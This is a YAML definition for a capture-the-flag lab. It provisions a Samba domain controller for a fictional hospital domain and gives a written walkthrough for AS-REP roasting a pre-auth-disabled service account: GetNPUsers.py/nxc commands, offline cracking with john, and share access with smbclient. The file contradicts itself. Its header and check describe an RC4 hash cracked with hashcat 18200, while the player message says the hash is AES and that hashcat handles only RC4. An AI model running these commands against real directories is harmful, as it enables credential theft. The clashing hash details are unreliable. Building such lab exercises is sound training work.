# yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
# AS-REP roasting as a single-container Isoloom lab: one Samba Active Directory Domain
# Controller for LAKESIDE.LAB (Lakeside Regional Hospital, a healthcare provider), no Windows
# VMs. It provisions a set of ordinary hospital staff users plus one legacy service account
# whose Kerberos pre-authentication is disabled (svc-scanner, UF_DONT_REQUIRE_PREAUTH, weak RC4
# key) and an imaging share only that account may read. With nothing but a username list, the
# student AS-REP roasts svc-scanner, cracks the $krb5asrep$ hash offline, and reads the flag.
# `isoloom generate`, then `isothrum up . --target docker`.
version: 1

name: asrep-roast-lakeside

# Given by the CyberCTF launcher: this player's flag. Without it the development flag.
inputs: [CTF_FLAG_MAIN]

networks:
  lab: { cidr: 10.30.10.0/24, internet: false }

machines:
  dc:
    networks: { lab: 10 }
    aliases: [dc.lakeside.lab, lakeside.lab]
    resources: { cpus: 4, memory_mb: 3072 }
    ports:
      dns:         { port: 53,   protocol: tcp }
      dns-udp:     { port: 53,   protocol: udp }
      kerberos:    { port: 88,   protocol: tcp }
      kerberos-udp: { port: 88,  protocol: udp }
      ldap:        { port: 389,  protocol: tcp }
      smb:         { port: 445,  protocol: tcp }
      kpasswd:     { port: 464,  protocol: tcp }
      kpasswd-udp: { port: 464,  protocol: udp }
      ldaps:       { port: 636,  protocol: tls }
      gc:          { port: 3268, protocol: tcp }
    # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism);
    # provisioning copies it into the imaging share that only svc-scanner may read.
    files:
      - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
    # A pre-built image (published to Docker Hub by .github/workflows/image.yml) beside the
    # local build: the launcher pulls the published image when it can and only builds build/dc
    # when it cannot, so a student skips the ~10-minute Samba + hashcat build. If Docker Hub is
    # unreachable or the image is missing, the lab still comes up by building locally. The tag is
    # the Compose service name (`dc`), matching the publishing action's tag-per-service scheme.
    app:
      image: cyberctf/ad-asrep-roasting:dc
      build: build/dc

checks:
  - { name: the KDC answers, tcp: dc:88, wait: 120 }
  - { name: LDAP answers, tcp: dc:389, wait: 120 }
  - { name: SMB answers, tcp: dc:445, wait: 120 }
  # End-to-end AS-REP roast, driven from inside the DC: a pre-auth-less AS-REQ against the
  # username list yields svc-scanner's $krb5asrep$ hash, cracked (hashcat 18200) to the weak
  # password, and that password reads the flag. Passes only when the DC is genuinely roastable;
  # the heavy step is gated behind the ports.
  - name: AS-REP roasting svc-scanner recovers the password and unlocks the flag
    from: dc
    exec: /opt/asrep/check.sh
    expect: ASREP_OK
    wait: 180

message: |
  # AS-REP Roasting — Lakeside Regional Hospital (LAKESIDE.LAB)

  **Lakeside Regional Hospital** runs its network on a single Active Directory Domain
  Controller (Samba) for the realm **LAKESIDE.LAB**:

  - **DC:** `dc.lakeside.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
  - You have only a list of likely usernames (no credentials).

  **Objective:** a legacy document-scanner service account has **Kerberos pre-authentication
  disabled** (`userAccountControl` bit `DONT_REQ_PREAUTH`). The AS-REP for such an account — the
  KDC reply encrypted with the account's own key — is the crackable material of an AS-REP roast.
  Recover that account's password and use it to read the flag from a share you cannot otherwise
  open.

  Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:

  1. **AS-REP roast the username list (no credentials):**
     `GetNPUsers.py LAKESIDE.LAB/ -usersfile users.txt -no-pass -dc-ip {{ machines.dc.addresses.lab }} -format john`
     (or `nxc ldap {{ machines.dc.addresses.lab }} -u users.txt -p '' --asreproast out.txt`)
     → only `svc-scanner`, the pre-auth-disabled account, returns a `$krb5asrep$...` hash; the
     ordinary staff accounts are refused. This is a modern DC, so the hash is AES (`$krb5asrep$18$`).
  2. **Crack it:** `john --format=krb5asrep --wordlist=rockyou.txt asrep.hash` (the password is a
     weak word built from the scanner service's name and a year). John's `krb5asrep` format cracks
     the AES AS-REP; `hashcat -m 18200` only handles the older RC4 form.
  3. **Loot the flag:** `smbclient //dc/imaging -U 'LAKESIDE\svc-scanner%<cracked>' -c 'get flag.txt'`.

  Submit the contents of `flag.txt`.
